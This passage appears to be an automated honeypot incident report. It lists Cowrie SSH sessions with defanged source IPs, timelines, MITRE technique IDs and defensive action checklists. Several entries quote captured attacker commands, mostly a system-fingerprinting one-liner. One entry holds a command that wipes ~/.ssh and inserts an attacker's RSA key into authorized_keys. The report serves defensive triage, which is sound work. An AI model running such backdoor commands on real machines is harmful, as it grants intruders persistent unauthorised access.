| `2026-08-22 15:42:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.246.46[.]144` to AbuseIPDB if not already reported
- [ ] Block `220.246.46[.]144` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f82009e78d96

| Field | Detail |
|---|---|
| **Source IP** | `211.53.58[.]10` |
| **First Seen** | 2026-08-22 15:42 |
| **Last Seen** | 2026-08-22 15:43 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 15:42:58` | `cowrie.session.connect` |
| `2026-08-22 15:42:59` | `cowrie.client.version` |
| `2026-08-22 15:42:59` | `cowrie.client.kex` |
| `2026-08-22 15:43:03` | `cowrie.login.success` |
| `2026-08-22 15:43:04` | `cowrie.direct-tcpip.request` |
| `2026-08-22 15:43:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.53.58[.]10` to AbuseIPDB if not already reported
- [ ] Block `211.53.58[.]10` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-262f811c570a

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-22 15:43 |
| **Last Seen** | 2026-08-22 15:43 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 15:43:12` | `cowrie.session.connect` |
| `2026-08-22 15:43:12` | `cowrie.client.version` |
| `2026-08-22 15:43:12` | `cowrie.client.kex` |
| `2026-08-22 15:43:13` | `cowrie.login.success` |
| `2026-08-22 15:43:13` | `cowrie.session.params` |
| `2026-08-22 15:43:13` | `cowrie.command.input` |
| `2026-08-22 15:43:13` | `cowrie.command.input` |
| `2026-08-22 15:43:13` | `cowrie.command.input` |
| `2026-08-22 15:43:13` | `cowrie.command.input` |
| `2026-08-22 15:43:13` | `cowrie.command.input` |
| `2026-08-22 15:43:13` | `cowrie.command.success` |
| `2026-08-22 15:43:13` | `cowrie.command.input` |
| `2026-08-22 15:43:13` | `cowrie.command.input` |
| `2026-08-22 15:43:13` | `cowrie.command.input` |
| `2026-08-22 15:43:13` | `cowrie.command.input` |
| `2026-08-22 15:43:14` | `cowrie.log.closed` |
| `2026-08-22 15:43:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d6add14f1ae4

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-22 15:44 |
| **Last Seen** | 2026-08-22 15:44 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 15:44:32` | `cowrie.session.connect` |
| `2026-08-22 15:44:32` | `cowrie.client.version` |
| `2026-08-22 15:44:32` | `cowrie.client.kex` |
| `2026-08-22 15:44:32` | `cowrie.login.success` |
| `2026-08-22 15:44:34` | `cowrie.session.params` |
| `2026-08-22 15:44:34` | `cowrie.command.input` |
| `2026-08-22 15:44:34` | `cowrie.command.input` |
| `2026-08-22 15:44:34` | `cowrie.command.input` |
| `2026-08-22 15:44:34` | `cowrie.command.input` |
| `2026-08-22 15:44:34` | `cowrie.command.input` |
| `2026-08-22 15:44:34` | `cowrie.command.success` |
| `2026-08-22 15:44:34` | `cowrie.command.input` |
| `2026-08-22 15:44:34` | `cowrie.command.input` |
| `2026-08-22 15:44:34` | `cowrie.command.input` |
| `2026-08-22 15:44:34` | `cowrie.command.input` |
| `2026-08-22 15:44:34` | `cowrie.log.closed` |
| `2026-08-22 15:44:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8133cfd04d99

| Field | Detail |
|---|---|
| **Source IP** | `45.178.227[.]0` |
| **First Seen** | 2026-08-22 15:44 |
| **Last Seen** | 2026-08-22 15:44 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 15:44:33` | `cowrie.session.connect` |
| `2026-08-22 15:44:34` | `cowrie.client.version` |
| `2026-08-22 15:44:34` | `cowrie.client.kex` |
| `2026-08-22 15:44:35` | `cowrie.login.success` |
| `2026-08-22 15:44:36` | `cowrie.direct-tcpip.request` |
| `2026-08-22 15:44:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.178.227[.]0` to AbuseIPDB if not already reported
- [ ] Block `45.178.227[.]0` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-02fe5dc72ba1

| Field | Detail |
|---|---|
| **Source IP** | `65.20.179[.]251` |
| **First Seen** | 2026-08-22 15:44 |
| **Last Seen** | 2026-08-22 15:44 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 15:44:41` | `cowrie.session.connect` |
| `2026-08-22 15:44:41` | `cowrie.client.version` |
| `2026-08-22 15:44:41` | `cowrie.client.kex` |
| `2026-08-22 15:44:43` | `cowrie.login.success` |
| `2026-08-22 15:44:43` | `cowrie.direct-tcpip.request` |
| `2026-08-22 15:44:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.179[.]251` to AbuseIPDB if not already reported
- [ ] Block `65.20.179[.]251` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-415b27d1e1fc

| Field | Detail |
|---|---|
| **Source IP** | `61.79.227[.]51` |
| **First Seen** | 2026-08-22 15:44 |
| **Last Seen** | 2026-08-22 15:44 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 15:44:44` | `cowrie.session.connect` |
| `2026-08-22 15:44:45` | `cowrie.client.version` |
| `2026-08-22 15:44:45` | `cowrie.client.kex` |
| `2026-08-22 15:44:47` | `cowrie.login.success` |
| `2026-08-22 15:44:48` | `cowrie.direct-tcpip.request` |
| `2026-08-22 15:44:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.79.227[.]51` to AbuseIPDB if not already reported
- [ ] Block `61.79.227[.]51` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f2d4edf09186

| Field | Detail |
|---|---|
| **Source IP** | `85.137.242[.]4` |
| **First Seen** | 2026-08-22 15:44 |
| **Last Seen** | 2026-08-22 15:45 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 15:44:54` | `cowrie.session.connect` |
| `2026-08-22 15:44:55` | `cowrie.client.version` |
| `2026-08-22 15:44:55` | `cowrie.client.kex` |
| `2026-08-22 15:44:58` | `cowrie.login.success` |
| `2026-08-22 15:44:59` | `cowrie.direct-tcpip.request` |
| `2026-08-22 15:45:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.137.242[.]4` to AbuseIPDB if not already reported
- [ ] Block `85.137.242[.]4` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-359831b7b231

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-22 15:45 |
| **Last Seen** | 2026-08-22 15:45 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 15:45:50` | `cowrie.session.connect` |
| `2026-08-22 15:45:51` | `cowrie.client.version` |
| `2026-08-22 15:45:51` | `cowrie.client.kex` |
| `2026-08-22 15:45:52` | `cowrie.login.success` |
| `2026-08-22 15:45:53` | `cowrie.session.params` |
| `2026-08-22 15:45:53` | `cowrie.command.input` |
| `2026-08-22 15:45:53` | `cowrie.command.input` |
| `2026-08-22 15:45:53` | `cowrie.command.input` |
| `2026-08-22 15:45:53` | `cowrie.command.input` |
| `2026-08-22 15:45:53` | `cowrie.command.input` |
| `2026-08-22 15:45:53` | `cowrie.command.success` |
| `2026-08-22 15:45:53` | `cowrie.command.input` |
| `2026-08-22 15:45:53` | `cowrie.command.input` |
| `2026-08-22 15:45:53` | `cowrie.command.input` |
| `2026-08-22 15:45:53` | `cowrie.command.input` |
| `2026-08-22 15:45:53` | `cowrie.log.closed` |
| `2026-08-22 15:45:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cfcbe7f8c5b0

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-22 15:47 |
| **Last Seen** | 2026-08-22 15:47 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 15:47:17` | `cowrie.session.connect` |
| `2026-08-22 15:47:17` | `cowrie.client.version` |
| `2026-08-22 15:47:17` | `cowrie.client.kex` |
| `2026-08-22 15:47:19` | `cowrie.login.success` |
| `2026-08-22 15:47:20` | `cowrie.session.params` |
| `2026-08-22 15:47:20` | `cowrie.command.input` |
| `2026-08-22 15:47:20` | `cowrie.command.input` |
| `2026-08-22 15:47:20` | `cowrie.command.input` |
| `2026-08-22 15:47:20` | `cowrie.command.input` |
| `2026-08-22 15:47:20` | `cowrie.command.input` |
| `2026-08-22 15:47:20` | `cowrie.command.success` |
| `2026-08-22 15:47:20` | `cowrie.command.input` |
| `2026-08-22 15:47:20` | `cowrie.command.input` |
| `2026-08-22 15:47:20` | `cowrie.command.input` |
| `2026-08-22 15:47:20` | `cowrie.command.input` |
| `2026-08-22 15:47:21` | `cowrie.log.closed` |
| `2026-08-22 15:47:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-08ddabd0853f

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-22 15:48 |
| **Last Seen** | 2026-08-22 15:48 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 15:48:34` | `cowrie.session.connect` |
| `2026-08-22 15:48:35` | `cowrie.client.version` |
| `2026-08-22 15:48:35` | `cowrie.client.kex` |
| `2026-08-22 15:48:36` | `cowrie.login.success` |
| `2026-08-22 15:48:38` | `cowrie.session.params` |
| `2026-08-22 15:48:38` | `cowrie.command.input` |
| `2026-08-22 15:48:38` | `cowrie.command.input` |
| `2026-08-22 15:48:38` | `cowrie.command.input` |
| `2026-08-22 15:48:38` | `cowrie.command.input` |
| `2026-08-22 15:48:38` | `cowrie.command.input` |
| `2026-08-22 15:48:38` | `cowrie.command.success` |
| `2026-08-22 15:48:38` | `cowrie.command.input` |
| `2026-08-22 15:48:38` | `cowrie.command.input` |
| `2026-08-22 15:48:39` | `cowrie.command.input` |
| `2026-08-22 15:48:39` | `cowrie.command.input` |
| `2026-08-22 15:48:39` | `cowrie.log.closed` |
| `2026-08-22 15:48:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e47398fc661e

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-22 15:49 |
| **Last Seen** | 2026-08-22 15:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 15:49:34` | `cowrie.session.connect` |
| `2026-08-22 15:49:34` | `cowrie.client.version` |
| `2026-08-22 15:49:34` | `cowrie.client.kex` |
| `2026-08-22 15:49:35` | `cowrie.login.success` |
| `2026-08-22 15:49:35` | `cowrie.direct-tcpip.request` |
| `2026-08-22 15:49:36` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-22 15:49:36` | `cowrie.direct-tcpip.data` |
| `2026-08-22 15:49:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-10fc5685fe80

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-22 15:49 |
| **Last Seen** | 2026-08-22 15:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 15:49:38` | `cowrie.session.connect` |
| `2026-08-22 15:49:38` | `cowrie.client.version` |
| `2026-08-22 15:49:38` | `cowrie.client.kex` |
| `2026-08-22 15:49:39` | `cowrie.login.success` |
| `2026-08-22 15:49:39` | `cowrie.direct-tcpip.request` |
| `2026-08-22 15:49:39` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-22 15:49:39` | `cowrie.direct-tcpip.data` |
| `2026-08-22 15:49:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-daa5832e647e

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-22 15:49 |
| **Last Seen** | 2026-08-22 15:49 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 15:49:51` | `cowrie.session.connect` |
| `2026-08-22 15:49:51` | `cowrie.client.version` |
| `2026-08-22 15:49:51` | `cowrie.client.kex` |
| `2026-08-22 15:49:53` | `cowrie.login.success` |
| `2026-08-22 15:49:55` | `cowrie.session.params` |
| `2026-08-22 15:49:55` | `cowrie.command.input` |
| `2026-08-22 15:49:55` | `cowrie.command.input` |
| `2026-08-22 15:49:55` | `cowrie.command.input` |
| `2026-08-22 15:49:55` | `cowrie.command.input` |
| `2026-08-22 15:49:55` | `cowrie.command.input` |
| `2026-08-22 15:49:55` | `cowrie.command.success` |
| `2026-08-22 15:49:55` | `cowrie.command.input` |
| `2026-08-22 15:49:55` | `cowrie.command.input` |
| `2026-08-22 15:49:55` | `cowrie.command.input` |
| `2026-08-22 15:49:55` | `cowrie.command.input` |
| `2026-08-22 15:49:56` | `cowrie.log.closed` |
| `2026-08-22 15:49:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3fa4ca7bb270

| Field | Detail |
|---|---|
| **Source IP** | `173.249.52[.]138` |
| **First Seen** | 2026-08-22 15:50 |
| **Last Seen** | 2026-08-22 15:50 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 15:50:52` | `cowrie.session.connect` |
| `2026-08-22 15:50:52` | `cowrie.client.version` |
| `2026-08-22 15:50:52` | `cowrie.client.kex` |
| `2026-08-22 15:50:52` | `cowrie.login.success` |
| `2026-08-22 15:50:53` | `cowrie.session.params` |
| `2026-08-22 15:50:53` | `cowrie.command.input` |
| `2026-08-22 15:50:53` | `cowrie.command.failed` |
| `2026-08-22 15:50:53` | `cowrie.log.closed` |
| `2026-08-22 15:50:54` | `cowrie.session.params` |
| `2026-08-22 15:50:54` | `cowrie.command.input` |
| `2026-08-22 15:50:54` | `cowrie.session.file_download` |
| `2026-08-22 15:50:54` | `cowrie.log.closed` |
| `2026-08-22 15:50:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `173.249.52[.]138` to AbuseIPDB if not already reported
- [ ] Block `173.249.52[.]138` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4a3d48adcce7

| Field | Detail |
|---|---|
| **Source IP** | `173.249.52[.]138` |
| **First Seen** | 2026-08-22 15:50 |
| **Last Seen** | 2026-08-22 15:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 15:50:54` | `cowrie.session.connect` |
| `2026-08-22 15:50:54` | `cowrie.client.version` |
| `2026-08-22 15:50:54` | `cowrie.client.kex` |
| `2026-08-22 15:50:55` | `cowrie.login.success` |
| `2026-08-22 15:50:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `173.249.52[.]138` to AbuseIPDB if not already reported
- [ ] Block `173.249.52[.]138` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-caca29525ac0

| Field | Detail |
|---|---|
| **Source IP** | `173.249.52[.]138` |
| **First Seen** | 2026-08-22 15:50 |
| **Last Seen** | 2026-08-22 15:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 15:50:55` | `cowrie.session.connect` |
| `2026-08-22 15:50:55` | `cowrie.client.version` |
| `2026-08-22 15:50:55` | `cowrie.client.kex` |
| `2026-08-22 15:50:55` | `cowrie.login.success` |
| `2026-08-22 15:50:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `173.249.52[.]138` to AbuseIPDB if not already reported
- [ ] Block `173.249.52[.]138` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-500203c99230

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-22 15:51 |
| **Last Seen** | 2026-08-22 15:51 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 15:51:04` | `cowrie.session.connect` |
| `2026-08-22 15:51:05` | `cowrie.client.version` |
| `2026-08-22 15:51:05` | `cowrie.client.kex` |
| `2026-08-22 15:51:06` | `cowrie.login.success` |
| `2026-08-22 15:51:08` | `cowrie.session.params` |
| `2026-08-22 15:51:08` | `cowrie.command.input` |
| `2026-08-22 15:51:08` | `cowrie.command.input` |
| `2026-08-22 15:51:08` | `cowrie.command.input` |
| `2026-08-22 15:51:08` | `cowrie.command.input` |
| `2026-08-22 15:51:08` | `cowrie.command.input` |
